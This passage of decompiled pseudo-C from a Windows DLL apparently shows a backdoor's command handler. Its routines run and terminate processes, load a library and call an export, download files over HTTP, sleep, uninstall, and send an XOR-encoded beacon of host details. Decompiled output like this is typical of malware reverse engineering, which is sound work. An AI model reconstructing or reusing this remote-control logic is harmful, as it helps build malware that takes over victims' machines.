  v5 = (void *)sub_1000358F(lpCommandLine, ExitCode, &dwProcessId);
  v6 = v5;
  if ( v5 == (void *)-1 || !v5 )
  {
    v10 = 11;
    goto LABEL_13;
  }
  if ( WaitForSingleObject(v5, dwMilliseconds) )
  {
    if ( dwProcessId )
    {
      CloseHandle(v6);
      v6 = 0;
      if ( !sub_1000CE6A(dwProcessId) )
      {
        v7 = OpenProcess(1u, 0, dwProcessId);
        v6 = v7;
        if ( v7 )
          TerminateProcess(v7, 0);
      }
    }
    Sleep(0x3E8u);
    v10 = 9;
    goto LABEL_13;
  }
  if ( !GetExitCodeProcess(v6, &ExitCode) )
  {
    v10 = 10;
LABEL_13:
    v8 = v10;
    goto LABEL_14;
  }
  sub_10004616(this, ExitCode);
  v8 = 0;
LABEL_14:
  if ( v6 != (void *)-1 && v6 )
    CloseHandle(v6);
  return v8;
}

//----- (100036BC) --------------------------------------------------------
int __stdcall sub_100036BC(LPSTR lpCommandLine, DWORD dwCreationFlags)
{
  void *v2; // eax
  int v4; // [esp+0h] [ebp-4h] BYREF

  v4 = 0;
  v2 = (void *)sub_1000358F(lpCommandLine, dwCreationFlags, (DWORD *)&v4);
  if ( v2 == (void *)-1 || !v2 )
    return 11;
  CloseHandle(v2);
  return 0;
}

//----- (100036EE) --------------------------------------------------------
int __thiscall sub_100036EE(void *this, int a2, int a3)
{
  const CHAR *v4; // esi
  int v5; // esi
  HMODULE LibraryA; // eax
  HMODULE v7; // edi
  int (*ProcAddress)(void); // eax
  int v9; // esi
  const CHAR *v10; // eax
  int v13; // [esp-4h] [ebp-10h]

  if ( a2 < 4 || !*(_DWORD *)(a3 + 12) )
    return 1;
  v4 = *(const CHAR **)(a3 + 16);
  if ( !v4 )
    return 2;
  LibraryA = LoadLibraryA(*(LPCSTR *)(a3 + 12));
  v7 = LibraryA;
  if ( LibraryA )
  {
    ProcAddress = GetProcAddress(LibraryA, v4);
    if ( ProcAddress )
    {
      v9 = ProcAddress();
      v10 = (const CHAR *)sub_10008918((int)&unk_10013A38);
      sub_100045FA((int)this, v10);
      sub_10004616(this, v9);
      v5 = 0;
      goto LABEL_13;
    }
    v13 = 4;
  }
  else
  {
    v13 = 3;
  }
  v5 = v13;
LABEL_13:
  if ( v7 != (HMODULE)-1 && v7 && !FreeLibrary(v7) )
    sub_10004616(this, 5);
  return v5;
}

//----- (1000377D) --------------------------------------------------------
int __thiscall sub_1000377D(_DWORD **this, _DWORD *a2, void **a3, int a4)
{
  int v4; // ebx
  int v7; // [esp-4h] [ebp-30h]
  DWORD nNumberOfBytesToWrite; // [esp+Ch] [ebp-20h] BYREF
  LPCSTR lpFileName; // [esp+10h] [ebp-1Ch] BYREF
  int v10; // [esp+14h] [ebp-18h] BYREF
  int v11; // [esp+18h] [ebp-14h] BYREF
  int v12; // [esp+1Ch] [ebp-10h] BYREF
  int v13; // [esp+20h] [ebp-Ch] BYREF
  LPCSTR v14; // [esp+24h] [ebp-8h] BYREF
  void *Src; // [esp+28h] [ebp-4h] BYREF

  v4 = 15;
  v14 = 0;
  lpFileName = 0;
  v10 = 0;
  v12 = 0;
  v13 = 80;
  nNumberOfBytesToWrite = 0;
  Src = 0;
  v11 = 0;
  if ( !sub_10003903(this, a2, &v14, &v10, &lpFileName, &v12, &v13) )
  {
    v7 = 14;
LABEL_3:
    v4 = v7;
    goto LABEL_11;
  }
  if ( sub_10003852((int)this, (int)this + 538, v12, v13, v14, a4, &Src, (int)&v11) )
  {
    if ( sub_10008C74(&unk_10010394, (int *)Src, v11, a3, &nNumberOfBytesToWrite) )
    {
      v7 = 23;
      goto LABEL_3;
    }
    if ( v10 == 1 && !sub_1000BC61(*a3, nNumberOfBytesToWrite, lpFileName, 1u) )
    {
      v7 = 22;
      goto LABEL_3;
    }
    v4 = 0;
  }
LABEL_11:
  if ( Src )
    (*(void (__thiscall **)(_DWORD *, void *))(*this[2] + 28))(this[2], Src);
  return v4;
}

//----- (10003852) --------------------------------------------------------
int __thiscall sub_10003852(int this, int a2, int a3, int a4, LPCSTR a5, int a6, _DWORD *a7, int a8)
{
  int v9; // eax
  int v11; // [esp+8h] [ebp-Ch]
  int v12; // [esp+Ch] [ebp-8h] BYREF
  void *Block; // [esp+10h] [ebp-4h] BYREF

  *(_DWORD *)(this + 812) = a6;
  v11 = 0;
  Block = 0;
  v12 = 0;
  if ( !sub_1000456F((void *)this, &Block, &v12, 0, 0, a5) || !Block )
    return 0;
  v9 = (*(int (__thiscall **)(_DWORD, void *, int, _DWORD *, int, int, int, int, _DWORD))(**(_DWORD **)(this + 8) + 16))(
         *(_DWORD *)(this + 8),
         Block,
         v12,
         a7,
         a8,
         a3,
         a2,
         a4,
         0);
  if ( !v9 )
  {
    v11 = 1;
LABEL_7:
    ++*(_DWORD *)(this + 920);
    *(_DWORD *)(this + 80) = 0;
    goto LABEL_8;
  }
  if ( v9 == 4 )
    goto LABEL_7;
LABEL_8:
  if ( Block )
  {
    free(Block);
    Block = 0;
    v12 = 0;
  }
  if ( !v11 && a7 )
  {
    if ( *a7 )
    {
      (*(void (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(this + 8) + 28))(*(_DWORD *)(this + 8), *a7);
      *a7 = 0;
    }
  }
  return v11;
}

//----- (10003903) --------------------------------------------------------
int __thiscall sub_10003903(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, _WORD *a7)
{
  int v8; // eax
  const char *v9; // eax
  int v10; // eax
  int v12; // eax
  const char *v13; // esi
  const CHAR *v14; // [esp-4h] [ebp-Ch]

  v8 = a2[3];
  if ( !v8 )
    return 0;
  *a3 = v8;
  v9 = (const char *)a2[4];
  if ( !v9 )
    return 0;
  if ( !strncmp(v9, Str2, 1u) )
  {
    *a4 = 1;
    v10 = a2[5];
    if ( !v10 )
      return 0;
    v14 = (const CHAR *)a2[5];
    *a5 = v10;
    if ( !sub_1000B695(v14) )
      return 0;
  }
  v12 = a2[6];
  if ( v12 )
  {
    *a6 = v12;
    v13 = (const char *)a2[7];
    if ( v13 )
      *a7 = atoi(v13);
    else
      *a7 = 80;
  }
  else
  {
    (*(void (__thiscall **)(void *, _DWORD *, _WORD *))(*(_DWORD *)this + 28))(this, a6, a7);
  }
  return 1;
}

//----- (1000399C) --------------------------------------------------------
int __thiscall sub_1000399C(void *this, _DWORD *a2, void *Src, size_t Size, CHAR *a5)
{
  DWORD TickCount; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  int v10; // eax
  CHAR String[36]; // [esp+Ch] [ebp-38h] BYREF
  LPCSTR lpFileName; // [esp+30h] [ebp-14h] BYREF
  int v14; // [esp+34h] [ebp-10h] BYREF
  LPCSTR lpString; // [esp+38h] [ebp-Ch] BYREF
  int v16; // [esp+3Ch] [ebp-8h] BYREF
  int v17; // [esp+40h] [ebp-4h] BYREF

  memset(String, 0, 34);
  lpString = 0;
  lpFileName = 0;
  v14 = 0;
  v16 = 0;
  v17 = 80;
  if ( !sub_10003903(this, a2, &lpString, &v14, &lpFileName, &v16, &v17) )
    return 12;
  TickCount = GetTickCount();
  wsprintfA(String, "%lu", TickCount);
  if ( a5 != (CHAR *)2 )
  {
    v8 = (const CHAR *)sub_10008918((int)&unk_100139FC);
    sub_100045FA((int)this, v8);
    sub_100045FA((int)this, lpString);
    v9 = (const CHAR *)sub_10008918((int)&unk_10013A68);
    sub_100045FA((int)this, v9);
    sub_100045FA((int)this, String);
  }
  if ( v14 == 1 )
    v10 = sub_10003AA6(this, (int)this + 538, v16, v17, String, lpFileName, a5);
  else
    v10 = sub_10003B0A((int)this, (int)this + 538, v16, v17, String, Src, Size, a5);
  if ( !v10 )
    return 13;
  return 0;
}

//----- (10003AA6) --------------------------------------------------------
int __thiscall sub_10003AA6(void *this, int a2, int a3, int a4, LPCSTR a5, LPCSTR lpFileName, CHAR *a7)
{
  int v8; // esi
  size_t Size; // [esp+8h] [ebp-8h] BYREF
  void *Block; // [esp+Ch] [ebp-4h] BYREF

  Block = 0;
  Size = 0;
  v8 = sub_10003C15(lpFileName, &Block, &Size);
  if ( v8 )
    v8 = sub_10003B0A((int)this, a2, a3, a4, a5, Block, Size, a7);
  if ( Block )
    free(Block);
  return v8;
}

//----- (10003B0A) --------------------------------------------------------
BOOL __thiscall sub_10003B0A(int this, int a2, int a3, int a4, LPCSTR a5, void *Src, size_t Size, CHAR *a8)
{
  BOOL v9; // ebx
  const CHAR *v10; // eax
  int v12; // [esp+Ch] [ebp-Ch] BYREF
  size_t v13; // [esp+10h] [ebp-8h] BYREF
  void *Block; // [esp+14h] [ebp-4h] BYREF

  *(_DWORD *)(this + 812) = a8;
  v9 = 0;
  Block = 0;
  v12 = 0;
  a8 = 0;
  v13 = 0;
  if ( !sub_10008A3A(&unk_10010394, Src, Size, (void **)&a8, &v13)
    || (v10 = (const CHAR *)sub_10008918((int)a12), sub_10004644((void **)&a8, &v13, v10, 1)) )
  {
    if ( sub_1000456F((void *)this, &Block, &v12, a8, v13, a5) && Block )
      v9 = sub_10003BD2((_DWORD **)this, a2, a3, a4, (int)Block, v12) != 0;
  }
  sub_10008DAB(a8);
  a8 = 0;
  if ( Block )
    free(Block);
  return v9;
}

//----- (10003BD2) --------------------------------------------------------
int __thiscall sub_10003BD2(_DWORD **this, int a2, int a3, int a4, int a5, unsigned int a6)
{
  int v7; // edi
  int v8; // eax

  v7 = 0;
  if ( sub_10004D95(a6) )
  {
    v8 = (*(int (__thiscall **)(_DWORD *, int, unsigned int, _DWORD, _DWORD, int, int, int, _DWORD))(*this[2] + 16))(
           this[2],
           a5,
           a6,
           0,
           0,
           a3,
           a2,
           a4,
           0);
    if ( v8 == 4 || !v8 )
      return 1;
  }
  return v7;
}

//----- (10003C15) --------------------------------------------------------
int __stdcall sub_10003C15(LPCSTR lpFileName, LPVOID *a2, DWORD *a3)
{
  int v3; // edi
  HANDLE FileA; // eax
  DWORD FileSize; // eax
  DWORD *v6; // esi
  void *v7; // eax
  LPVOID *v8; // ebx
  HANDLE hFile; // [esp+4h] [ebp-4h]

  v3 = 0;
  if ( lpFileName )
  {
    FileA = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
    hFile = FileA;
    if ( FileA != (HANDLE)-1 )
    {
      FileSize = GetFileSize(FileA, 0);
      v6 = a3;
      *a3 = FileSize;
      if ( FileSize != -1 )
      {
        lpFileName = 0;
        v7 = malloc(FileSize + 1);
        v8 = a2;
        *a2 = v7;
        if ( v7 )
        {
          memset(v7, 0, *v6 + 1);
          if ( ReadFile(hFile, *v8, *v6, (LPDWORD)&lpFileName, 0) )
          {
            if ( lpFileName == (LPCSTR)*v6 )
              v3 = 1;
          }
        }
      }
      CloseHandle(hFile);
    }
  }
  return v3;
}

//----- (10003CAF) --------------------------------------------------------
int sub_10003CAF()
{
  if ( !sub_10005BA5() )
    return 16;
  sub_10004E53();
  return 0;
}

//----- (10003CC4) --------------------------------------------------------
int __thiscall sub_10003CC4(_DWORD *this, int a2, int a3)
{
  unsigned int v4; // eax
  unsigned int v5; // edi
  unsigned int v6; // esi
  BYTE v8[204]; // [esp-CCh] [ebp-DCh] BYREF
  int v9; // [esp+Ch] [ebp-4h]

  v9 = 0;
  if ( a2 < 3 )
    return 18;
  if ( !*(_DWORD *)(a3 + 12) )
    return 18;
  v4 = atoi(*(const char **)(a3 + 12));
  v5 = v4;
  if ( !v4 )
    return 18;
  if ( a2 != 5 )
  {
    if ( a2 == 6 )
    {
      if ( *(_DWORD *)(a3 + 16) )
      {
        v6 = atoi(*(const char **)(a3 + 16));
        if ( (v6 || !lstrcmpA(String1, *(LPCSTR *)(a3 + 16))) && v6 < 0x16 )
        {
          if ( v5 != 1 && (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[v6 + 207] + 8))(this[v6 + 207]) > v5 )
            return 19;
          this[v6 + 26] = v5;
          goto LABEL_16;
        }
      }
    }
    return 18;
  }
  if ( v4 < 0x258 )
    return 19;
  this[25] = v4;
LABEL_16:
  qmemcpy(v8, this + 19, sizeof(v8));
  if ( !sub_10004E27(v8[0]) )
    return 21;
  return v9;
}

//----- (10003DA2) --------------------------------------------------------
int __stdcall sub_10003DA2(int a1, int a2)
{
  int v2; // esi
  int v3; // eax

  v2 = 0;
  if ( a1 < 3 )
    return 24;
  if ( !*(_DWORD *)(a2 + 12) )
    return 24;
  v3 = atoi(*(const char **)(a2 + 12));
  if ( !v3 )
    return 24;
  Sleep(v3);
  return v2;
}

//----- (10003DD5) --------------------------------------------------------
int __thiscall sub_10003DD5(int this, char *Str1)
{
  int v3; // edi
  size_t v4; // eax
  void *v5; // eax
  DWORD v6; // eax
  CHAR v7; // al
  size_t v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  size_t v11; // ebx
  void *v12; // eax
  size_t v13; // eax
  const CHAR *v14; // eax
  size_t v15; // eax
  const CHAR *v16; // eax
  size_t v17; // eax
  const CHAR *v18; // eax
  size_t v19; // eax
  const CHAR *v20; // eax
  const CHAR *v21; // eax
  size_t v22; // eax
  const CHAR *v23; // eax
  size_t v24; // eax
  const CHAR *v25; // eax
  const CHAR *v26; // eax
  unsigned int v27; // eax
  int v28; // eax
  int j; // eax
  void **v30; // ebx
  int v32; // [esp+10h] [ebp-638h]
  unsigned int TickCount; // [esp+18h] [ebp-630h]
  CHAR Dst[1504]; // [esp+1Ch] [ebp-62Ch] BYREF
  DWORD v35; // [esp+5FCh] [ebp-4Ch]
  CHAR *i; // [esp+600h] [ebp-48h]
  char v37; // [esp+604h] [ebp-44h]
  int v38; // [esp+60Ch] [ebp-3Ch]
  char v39; // [esp+610h] [ebp-38h]
  void *v40; // [esp+614h] [ebp-34h]
  int v41; // [esp+618h] [ebp-30h]
  int v42; // [esp+61Ch] [ebp-2Ch]
  int v43; // [esp+620h] [ebp-28h]
  int v44; // [esp+628h] [ebp-20h]
  bool v45; // [esp+62Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+630h] [ebp-18h]

  v43 = 2;
  v3 = 0;
  v44 = 0;
  v38 = 0;
  v41 = 0;
  v37 = 0;
  v45 = 0;
  v39 = 0;
  v40 = 0;
  v42 = 0;
  ms_exc.registration.TryLevel = 0;
  v35 = 1500;
  memset(Dst, 0, 0x5DDu);
  v4 = strlen(Str);
  if ( !strncmp(Str1, Str, v4) )
  {
    v5 = malloc(0x320u);
    v3 = (int)v5;
    v40 = v5;
    if ( !v5 )
      goto LABEL_46;
    memset(v5, 0, 0x320u);
    v6 = ExpandEnvironmentStringsA(Str1, Dst, 0x5DCu);
    v35 = v6;
    if ( v6 <= 0x5DC )
    {
      if ( v6 )
      {
        for ( i = Dst; ; ++i )
        {
          v7 = *i;
          if ( !*i )
          {
LABEL_9:
            if ( v41 >= 3
              && v37 != 1
              && (!strncmp(*(const char **)(v3 + 8), Str2, 1u) || !strncmp(*(const char **)(v3 + 8), String1, 1u)) )
            {
              *(_DWORD *)(this + 4) = 1;
              TickCount = GetTickCount();
              v8 = strlen(dword_1001562C);
              if ( !strncmp(*(const char **)(v3 + 4), dword_1001562C, v8) )
              {
                v9 = (const CHAR *)sub_10008918((int)&unk_10013D28);
                sub_100045FA(this, v9);
                v42 = sub_1000377D((_DWORD **)this, (_DWORD *)v3, (void **)(this + 816), 3);
                v10 = (const CHAR *)sub_10008918((int)&unk_10013CF8);
                goto LABEL_15;
              }
              v13 = strlen(dword_10015668);
              if ( !strncmp(*(const char **)(v3 + 4), dword_10015668, v13) )
              {
                v14 = (const CHAR *)sub_10008918((int)&unk_10013CD0);
                sub_100045FA(this, v14);
                v42 = sub_1000399C(
                        (void *)this,
                        (_DWORD *)v3,
                        *(void **)(this + 820),
                        *(_DWORD *)(this + 824),
                        (CHAR *)4);
                v10 = (const CHAR *)sub_10008918((int)&unk_10013CA0);
                goto LABEL_15;
              }
              v15 = strlen(dword_10015640);
              if ( !strncmp(*(const char **)(v3 + 4), dword_10015640, v15) )
              {
                v16 = (const CHAR *)sub_10008918((int)&unk_10013C7C);
                sub_100045FA(this, v16);
                v42 = sub_100036EE((void *)this, v41, v3);
                v10 = (const CHAR *)sub_10008918((int)&unk_10013C4C);
                goto LABEL_15;
              }
              v17 = strlen(dword_1001563C);
              if ( !strncmp(*(const char **)(v3 + 4), dword_1001563C, v17) )
              {
                v18 = (const CHAR *)sub_10008918((int)&unk_10013C24);
                sub_100045FA(this, v18);
                v42 = sub_10003425((void *)this, v41, (const char **)v3);
                v10 = (const CHAR *)sub_10008918((int)&unk_10013BF4);
                goto LABEL_15;
              }
              v19 = strlen(dword_10015630);
              if ( !strncmp(*(const char **)(v3 + 4), dword_10015630, v19) )
              {
                v20 = (const CHAR *)sub_10008918((int)&unk_10013BCC);
                sub_100045FA(this, v20);
                sub_10001EE5(420, 1, 13, 0);
                v42 = sub_10003CAF();
                v21 = (const CHAR *)sub_10008918((int)&unk_10013B9C);
                sub_100045FA(this, v21);
                sub_10004616((void *)this, v42);
                v43 = 0;
                goto LABEL_42;
              }
              v22 = strlen(dword_10015620);
              if ( !strncmp(*(const char **)(v3 + 4), dword_10015620, v22) )
              {
                v23 = (const CHAR *)sub_10008918((int)&unk_10013B74);
                sub_100045FA(this, v23);
                v42 = sub_10003CC4((_DWORD *)this, v41, v3);
                v10 = (const CHAR *)sub_10008918((int)&unk_10013B40);
LABEL_15:
                sub_100045FA(this, v10);
                sub_10004616((void *)this, v42);
                goto LABEL_42;
              }
              v24 = strlen(dword_10015648);
              if ( !strncmp(*(const char **)(v3 + 4), dword_10015648, v24) )
              {
                v25 = (const CHAR *)sub_10008918((int)&unk_10013B1C);
                sub_100045FA(this, v25);
                v42 = sub_10003DA2(v41, v3);
                v10 = (const CHAR *)sub_10008918((int)&unk_10013AEC);
                goto LABEL_15;
              }
              v43 = 4;
              *(_DWORD *)(this + 4) = 0;
LABEL_42:
              if ( *(_DWORD *)(this + 4) == 1 )
              {
                v26 = (const CHAR *)sub_10008918((int)&unk_10013ACC);
                sub_100045FA(this, v26);
                v27 = GetTickCount();
                v28 = sub_10004D7D(v27, TickCount);
                sub_10004616((void *)this, v28);
              }
              if ( v42 && !strncmp(*(const char **)(v3 + 8), Str2, 1u) )
LABEL_46:
                v43 = 1;
            }
            break;
          }
          if ( v41 == 200 )
          {
            v37 = 1;
            goto LABEL_9;
          }
          if ( v7 == 34 )
          {
            v45 = !v45;
            v39 = 1;
          }
          if ( v7 == 32 )
          {
            v11 = v38 - v44;
            if ( v38 == v44 )
            {
              v44 = v38 + 1;
            }
            else
            {
              if ( v45 )
              {
                ++v38;
                continue;
              }
              if ( v39 )
                v39 = 0;
              v12 = malloc(v11 + 1);
              *(_DWORD *)(v3 + 4 * v41) = v12;
              if ( !v12 )
                goto LABEL_46;
              memcpy(v12, &Dst[v44], v11);
              *(_BYTE *)(v11 + *(_DWORD *)(v3 + 4 * v41)) = 0;
              v44 = v38 + 1;
              ++v41;
            }
          }
          ++v38;
        }
      }
    }
  }
  ms_exc.registration.TryLevel = 2;
  if ( v3 )
  {
    for ( j = 0; ; j = v32 + 1 )
    {
      v32 = j;
      if ( j >= v41 )
        break;
      v30 = (void **)(v3 + 4 * j);
      if ( *v30 )
      {
        free(*v30);
        *v30 = 0;
      }
    }
    free((void *)v3);
    v40 = 0;
  }
  if ( *(_DWORD *)(this + 816) )
  {
    (*(void (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(this + 8) + 28))(
      *(_DWORD *)(this + 8),
      *(_DWORD *)(this + 816));
    *(_DWORD *)(this + 816) = 0;
  }
  if ( *(_DWORD *)(this + 820) )
  {
    free(*(void **)(this + 820));
    *(_DWORD *)(this + 820) = 0;
    *(_DWORD *)(this + 824) = 0;
  }
  return v43;
}
// 10003DD5: using guessed type CHAR Dst[1504];

//----- (1000436A) --------------------------------------------------------
char __thiscall sub_1000436A(void *this, void **a2, _DWORD *a3, LPCSTR lpString)
{
  char v4; // bl
  const CHAR *v5; // eax
  size_t Size; // [esp+8h] [ebp-8h] BYREF
  void *Block; // [esp+Ch] [ebp-4h] BYREF

  Block = 0;
  Size = 0;
  v4 = 0;
  if ( sub_10004767((int)this, &Block, &Size, lpString) )
  {
    if ( sub_10008A3A(&unk_10010394, Block, Size, a2, a3) )
    {
      v5 = (const CHAR *)sub_10008918((int)a12);
      sub_10004644(a2, a3, v5, 1);
    }
    else
    {
      v4 = 1;
    }
  }
  if ( Block )
    free(Block);
  return v4;
}

//----- (100043E5) --------------------------------------------------------
char __thiscall sub_100043E5(int *this, void **a2, int *a3, LPCSTR lpString, int a5)
{
  const CHAR *v7; // eax
  void *v8; // ecx
  int v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // eax
  const CHAR *v13; // eax
  unsigned int i; // eax
  CHAR String; // [esp+Ch] [ebp-Ch] BYREF
  int v17; // [esp+Dh] [ebp-Bh]
  int v18; // [esp+11h] [ebp-7h]
  char v19; // [esp+15h] [ebp-3h]
  char v20; // [esp+17h] [ebp-1h]
  int v21; // [esp+24h] [ebp+Ch]

  String = 0;
  v17 = 0;
  v20 = 0;
  v18 = 0;
  v19 = 0;
  sub_10008B80((int)&String, 10);
  if ( sub_10004644(a2, a3, &String, 10) )
  {
    v21 = *a3;
    v7 = (const CHAR *)sub_10008918((int)&unk_10013DC0);
    if ( sub_10004644(a2, a3, v7, 0) )
    {
      v9 = sub_10004B3D(v8);
      if ( sub_100046DB(a2, a3, v9) )
      {
        v10 = (const CHAR *)sub_10008918((int)&unk_10013DA4);
        if ( sub_10004644(a2, a3, v10, 0) )
        {
          if ( sub_100046DB(a2, a3, 1) )
          {
            v11 = (const CHAR *)sub_10008918((int)&unk_10013D88);
            if ( sub_10004644(a2, a3, v11, 0) )
            {
              if ( sub_100046DB(a2, a3, this[203]) )
              {
                v12 = (const CHAR *)sub_10008918((int)&unk_10013D6C);
                if ( sub_10004644(a2, a3, v12, 0) )
                {
                  if ( sub_10004644(a2, a3, lpString, 0) )
                  {
                    v13 = (const CHAR *)sub_10008918((int)&unk_10013D50);
                    if ( sub_10004644(a2, a3, v13, 0) )
                    {
                      if ( sub_100046DB(a2, a3, a5) && sub_10004644(a2, a3, ::String, 1) )
                      {
                        for ( i = v21; i < *a3; ++i )
                          *((_BYTE *)*a2 + i) ^= *(&String + (i - v21) % 0xA);
                        return 1;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return v20;
}
// 1000444E: variable 'v8' is possibly undefined

//----- (1000456F) --------------------------------------------------------
char __thiscall sub_1000456F(void *this, void **a2, int *a3, LPCSTR a4, int a5, LPCSTR a6)
{
  char v7; // bl
  size_t Size; // [esp+8h] [ebp-8h] BYREF
  LPCSTR lpString; // [esp+Ch] [ebp-4h] BYREF

  lpString = 0;
  Size = 0;
  v7 = 0;
  if ( sub_1000436A(this, (void **)&lpString, &Size, a6)
    && sub_100043E5((int *)this, a2, a3, a6, Size)
    && sub_10004644(a2, a3, lpString, Size)
    && (!a4 || sub_10004644(a2, a3, a4, a5)) )
  {
    v7 = 1;
  }
  if ( lpString )
    sub_10008DAB((void *)lpString);
  return v7;
}

//----- (100045FA) --------------------------------------------------------
char __thiscall sub_100045FA(int this, LPCSTR lpString)
{
  return sub_10004644((void **)(this + 800), (_DWORD *)(this + 804), lpString, 0);
}

//----- (10004616) --------------------------------------------------------
char __thiscall sub_10004616(void *this, int a2)
{
  CHAR String[36]; // [esp+4h] [ebp-24h] BYREF

  wsprintfA(String, "%lu", a2);
  return sub_100045FA((int)this, String);
}

//----- (10004644) --------------------------------------------------------
char __stdcall sub_10004644(void **a1, _DWORD *a2, LPCSTR lpString, int Size)
{
  int v4; // edi
  void *v5; // eax
  _DWORD *v6; // esi
  void *v7; // eax

  v4 = Size;
  if ( !Size )
  {
    v4 = lstrlenA(lpString);
    if ( !v4 )
      return 1;
  }
  if ( *a1 )
  {
    v6 = a2;
    v7 = realloc(*a1, *a2 + v4 + 1);
    if ( v7 )
    {
      *a1 = v7;
      goto LABEL_11;
    }
    if ( *a1 )
    {
      free(*a1);
      *a1 = 0;
    }
    return 0;
  }
  v5 = malloc(v4 + 1);
  *a1 = v5;
  if ( !v5 )
    return 0;
  memset(v5, 0, v4);
  v6 = a2;
  *a2 = 0;
LABEL_11:
  memcpy((char *)*a1 + *v6, lpString, v4 + 1);
  *v6 += v4;
  return 1;
}

//----- (100046DB) --------------------------------------------------------
char __stdcall sub_100046DB(void **a1, _DWORD *a2, int a3)
{
  CHAR String[36]; // [esp+4h] [ebp-24h] BYREF

  wsprintfA(String, "%lu", a3);
  return sub_10004644(a1, a2, String, 0);
}

//----- (10004711) --------------------------------------------------------
BOOL __thiscall sub_10004711(int this)
{
  size_t v1; // eax
  int v3[8]; // [esp+0h] [ebp-20h] BYREF

  v3[0] = (int)String2;
  v3[1] = (int)String2;
  v3[2] = (int)String2;
  v3[3] = dword_10015750;
  v1 = *(_DWORD *)(this + 804);
  v3[4] = (int)String1;
  memset(&v3[5], 0, 12);
  return !v1 || sub_1000399C((void *)this, v3, *(void **)(this + 800), v1, (CHAR *)2) == 0;
}
// 10015750: using guessed type int dword_10015750;

//----- (10004767) --------------------------------------------------------
char __thiscall sub_10004767(int this, void **a2, _DWORD *a3, LPCSTR lpString)
{
  const CHAR *v5; // eax
  void *v6; // ecx
  int v7; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // eax
  const CHAR *v13; // eax
  int v14; // eax
  const CHAR *v15; // eax
  CHAR *v16; // eax
  const CHAR *v17; // eax
  int v18; // eax
  const CHAR *v19; // eax
  const CHAR *v20; // eax
  char *v21; // eax
  const CHAR *v22; // eax
  const CHAR *v23; // eax
  const CHAR *v24; // eax
  DWORD TickCount; // eax
  const CHAR *v26; // eax
  bool v27; // al
  const CHAR *v28; // eax
  void *v29; // ecx
  int v30; // eax
  const CHAR *v31; // eax
  const CHAR *v32; // eax
  char v34; // [esp+Fh] [ebp-1h]

  v34 = 0;
  v5 = (const CHAR *)sub_10008918((int)&unk_10014048);
  if ( sub_10004644(a2, a3, v5, 0) )
  {
    v7 = sub_10004B3D(v6);
    if ( sub_100046DB(a2, a3, v7) )
    {
      v8 = (const CHAR *)sub_10008918((int)&unk_10014024);
      if ( sub_10004644(a2, a3, v8, 0) )
      {
        if ( sub_10004644(a2, a3, dword_10015760, 0) )
        {
          v9 = (const CHAR *)sub_10008918((int)&unk_10014000);
          if ( sub_10004644(a2, a3, v9, 0) )
          {
            v10 = (const CHAR *)sub_10008918((int)&unk_10013FDC);
            if ( sub_10004644(a2, a3, v10, 0) )
            {
              v11 = (const CHAR *)sub_10008918((int)&unk_10013FBC);
              if ( sub_10004644(a2, a3, v11, 0) )
              {
                if ( sub_10004644(a2, a3, dword_100161B4, 0) )
                {
                  v12 = (const CHAR *)sub_10008918((int)&unk_10013F9C);
                  if ( sub_10004644(a2, a3, v12, 0) )
                  {
                    if ( sub_100046DB(a2, a3, *(_DWORD *)(this + 808)) )
                    {
                      v13 = (const CHAR *)sub_10008918((int)&unk_10013F74);
                      if ( sub_10004644(a2, a3, v13, 0) )
                      {
                        v14 = sub_1000D3AF();
                        if ( sub_100046DB(a2, a3, v14) )
                        {
                          v15 = (const CHAR *)sub_10008918((int)&unk_10013F4C);
                          if ( sub_10004644(a2, a3, v15, 0) )
                          {
                            v16 = sub_1000D5DC();
                            if ( sub_10004644(a2, a3, v16, 0) )
                            {
                              v17 = (const CHAR *)sub_10008918((int)&unk_10013F2C);
                              if ( sub_10004644(a2, a3, v17, 0) )
                              {
                                v18 = sub_10004BF2((int (__stdcall **)(_DWORD))this);
                                if ( sub_100046DB(a2, a3, v18) )
                                {
                                  v19 = (const CHAR *)sub_10008918((int)&unk_10013F0C);
                                  if ( sub_10004644(a2, a3, v19, 0) )
                                  {
                                    if ( sub_10004644(a2, a3, byte_10015730, 0) )
                                    {
                                      v20 = (const CHAR *)sub_10008918((int)&unk_10013EE4);
                                      if ( sub_10004644(a2, a3, v20, 0) )
                                      {
                                        v21 = sub_10004D02();
                                        if ( sub_10004644(a2, a3, v21, 0) )
                                        {
                                          v22 = (const CHAR *)sub_10008918((int)&unk_10013EBC);
                                          if ( sub_10004644(a2, a3, v22, 0) )
                                          {
                                            if ( sub_100046DB(a2, a3, *(_DWORD *)(this + 916)) )
                                            {
                                              v23 = (const CHAR *)sub_10008918((int)&unk_10013E90);
                                              if ( sub_10004644(a2, a3, v23, 0) )
                                              {
                                                if ( sub_100046DB(a2, a3, *(_DWORD *)(this + 920)) )
                                                {
                                                  v24 = (const CHAR *)sub_10008918((int)&unk_10013E6C);
                                                  if ( sub_10004644(a2, a3, v24, 0) )
                                                  {
                                                    TickCount = GetTickCount();
                                                    if ( sub_100046DB(a2, a3, TickCount / 0x3E8) )
                                                    {
                                                      v26 = (const CHAR *)sub_10008918((int)&unk_10013E48);
                                                      if ( sub_10004644(a2, a3, v26, 0) )
                                                      {
                                                        v27 = sub_1000D381();
                                                        if ( sub_100046DB(a2, a3, v27) )
                                                        {
                                                          v28 = (const CHAR *)sub_10008918((int)&unk_10013E24);
                                                          if ( sub_10004644(a2, a3, v28, 0) )
                                                          {
                                                            v30 = sub_10004B7F(v29);
                                                            if ( sub_100046DB(a2, a3, v30) )
                                                            {
                                                              v31 = (const CHAR *)sub_10008918((int)&unk_10013E00);
                                                              if ( sub_10004644(a2, a3, v31, 0) )
                                                              {
                                                                if ( sub_100046DB(a2, a3, *(_DWORD *)(this + 812)) )
                                                                {
                                                                  v32 = (const CHAR *)sub_10008918((int)&unk_10013DDC);
                                                                  if ( sub_10004644(a2, a3, v32, 0) )
                                                                  {
